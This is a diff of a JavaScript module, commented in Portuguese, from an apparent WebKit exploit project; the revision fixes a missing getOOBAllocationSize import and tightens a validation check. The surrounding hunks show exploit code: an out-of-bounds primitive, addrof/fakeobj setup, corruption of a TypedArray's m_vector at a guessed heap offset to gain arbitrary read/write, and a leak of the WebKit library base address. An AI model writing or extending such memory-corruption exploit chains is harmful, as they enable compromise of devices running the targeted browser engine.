@@ -1,11 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v132 - R92 Corrupção de Backing Store SEM Addrof na Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v133 - R93 Importar getOOBAllocationSize)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Abandona completamente o uso de addrof_func na Fase 5.
-// - Constrói a primitiva de L/E estável corrompendo o backing store de um TypedArray
-//   (arb_rw_array) assumindo que ele está em um offset RELATIVO conhecido ao
-//   oob_dataview_real dentro do oob_array_buffer_real.
-// - O objetivo é ter L/E arbitrária funcional sem addrof, e então usá-la para vazar a base WebKit.
+// - Corrigido ReferenceError para getOOBAllocationSize, importando-o de core_exploit.mjs.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,12 +10,13 @@ import {
     triggerOOB_primitive,
     getOOBDataView,
     oob_read_absolute, 
-    oob_write_absolute 
+    oob_write_absolute,
+    getOOBAllocationSize // NOVO: Importado getOOBAllocationSize
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v132_R92_NoAddrofForArbRWinPhase5";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v133_R93_ImportOOBSize";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -64,7 +61,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_read_stable = null;
     let arb_write_stable = null;
 
-    // NOVO: Definir a constante localmente, já que não pode ser importada de core_exploit
+    // Definir a constante localmente, já que não pode ser importada de core_exploit
     const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
 
     try {
@@ -89,7 +86,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true }); 
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
-        setupAddrofFakeobj(); // Configura as primitivas addrof/fakeobj APENAS UMA VEZ
+        setupAddrofFakeobj(); 
         
         let leaker_phase4 = { obj_prop: null, val_prop: 0 };
         const arb_read_phase4 = (addr, size_bytes = 8) => { 
@@ -145,31 +142,23 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         leaker_phase4 = null; 
         
         // Criar o arb_rw_array. Ele será alocado no heap.
-        // Se conseguirmos inferir sua posição em relação ao oob_array_buffer_real, podemos corrompê-lo.
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
         // ATENÇÃO: ESTE É O PONTO CRÍTICO. PRECISAMOS ACHAR O ENDEREÇO DO ARB_RW_ARRAY SEM ADDROF.
         // ASSUMIR UMA LOCALIZAÇÃO RELATIVA:
-        // Se o oob_array_buffer_real está em 0x0, e o oob_dataview_real está em 0x58.
-        // O arb_rw_array pode estar ALGUNS BYTES/KB depois do oob_dataview_real.
         // Isso é altamente dependente do alocador de heap e é especulativo.
         // Para testes, vamos assumir que ele está em um offset fixo conhecido do oob_array_buffer_real.
-        // Este valor precisa ser determinado por P&D ou engenharia reversa.
         const ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER = 0x800; // <<<< ESTE VALOR É UM CHUTE. PRECISA SER VALIDADO.
                                                              // Sugere que arb_rw_array é alocado a ~2KB do início do OOB.
                                                              // Ou é o offset da sua ArrayBufferView dentro do OOB.
 
-        // O endereço do ArrayBufferView do arb_rw_array é a base do arb_rw_array + offset do m_vector.
-        // Não temos o endereço JS de arb_rw_array aqui, apenas sua alocação esperada no buffer OOB.
-        // A estrutura ArrayBufferView começa no endereço que 'addrof' vazaria.
-        // Se 'arb_rw_array' foi alocado em 0x800, então seu ArrayBufferView começa lá.
         const arb_rw_array_ab_view_addr_in_oob_buffer = ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER;
 
         // Validar que o offset do ArrayBufferView é razoável (deve estar dentro do oob_array_buffer_real)
         if (arb_rw_array_ab_view_addr_in_oob_buffer < OOB_DV_METADATA_BASE_IN_OOB_BUFFER || 
-            arb_rw_array_ab_view_addr_in_oob_buffer >= getOOBAllocationSize()) {
-            throw new Error(`FALHA CRÍTICA: Offset assumido para arb_rw_array_ab_view_addr_in_oob_buffer (${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)}) é irrealista para o oob_array_buffer_real.`);
+            arb_rw_array_ab_view_addr_in_oob_buffer >= getOOBAllocationSize()) { // getOOBAllocationSize está agora importado
+            throw new Error(`FALHA CRÍTICA: Offset assumido para arb_rw_array_ab_view_addr_in_oob_buffer (${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)}) é irrealista para o oob_array_buffer_real (tamanho total ${getOOBAllocationSize()}).`);
         }
         logS3(`    Assumindo que ArrayBufferView de arb_rw_array está em offset ${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)} no oob_array_buffer_real.`, "warn");
 
@@ -187,8 +176,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (original_m_vector.equals(AdvancedInt64.Zero) || (original_m_vector.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: m_vector lido do arb_rw_array (${original_m_vector.toString(true)}) é inválido. O offset assumido para arb_rw_array pode estar incorreto.`);
         }
-        if (original_m_length === 0) { // Um ArrayBuffer de 0x1000 bytes deve ter m_length 0x1000
-             logS3(`    ALERTA: m_length de arb_rw_array é zero. Pode haver um problema no offset.`, "warn");
+        if (original_m_length === 0) { 
+             logS3(`    ALERTA: m_length de arb_rw_array é zero. Isso é inesperado para um ArrayBuffer alocado.`, "warn");
+             throw new Error(`FALHA CRÍTICA: m_length de arb_rw_array é zero. Isso indica que o offset assumido está incorreto, ou o ArrayBuffer não foi alocado corretamente.`);
         }
 
 
@@ -247,7 +237,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         }
         logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");
 
-        // webkit_base_addr = s_info_val - offset_de_s_info_na_lib_webkit
         const webkit_base_addr = s_info_val.sub(s_info_offset); 
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
